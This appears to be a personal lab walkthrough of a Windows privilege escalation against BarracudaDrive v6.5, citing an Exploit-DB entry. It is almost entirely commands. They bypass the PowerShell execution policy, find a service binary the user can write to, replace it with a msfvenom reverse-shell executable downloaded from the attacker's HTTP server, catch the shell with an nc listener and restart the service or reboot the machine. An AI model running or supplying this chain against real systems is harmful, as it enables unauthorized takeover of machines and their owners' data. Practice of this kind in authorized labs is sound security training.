
**BarracudaDrive v6.5 - Insecure Folder Permissions**
https://www.exploit-db.com/exploits/48789


reference: [[Medjed]]

start powershell command prompt
```powershell
powershell -ep bypass
```

enumerating the service 
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

check if we can replace the binary 
```powershell
icacls C:\bd\bd.exe 
```

and found that i have the write privilege over it. 

rename it (one of the following should work)
```powershell
ren bd.exe bd.exe_back
mv bd.exe bd.exe_bak
```

i generated a reverse shell as following 
```powershell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<% tp.frontmatter["RHOSTS"] %> LPORT=135 -f exe -o reverse.exe
```

start python server 
```powershell
python3 -m http.server 80
```

uploaded it 
```powershell
iwr -uri http://<% tp.frontmatter["RHOSTS"] %>/reverse.exe -Outfile C:\bd\bd.exe 
```

start a listener
```powershell
rlwrap -cAr nc -lvnp 135
```

Restart 'bd' service. 
```powershell
Restart-Service bd
```

in case it did not restart 
check permissions 
```powershell
 Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'bd'}
```
![600](Assets/Pasted%20image%2020250716233811.png)
if set to Auto, 
then i restart the device 
```powershell
shutdown /r /t 0
```

got reverse shell .. 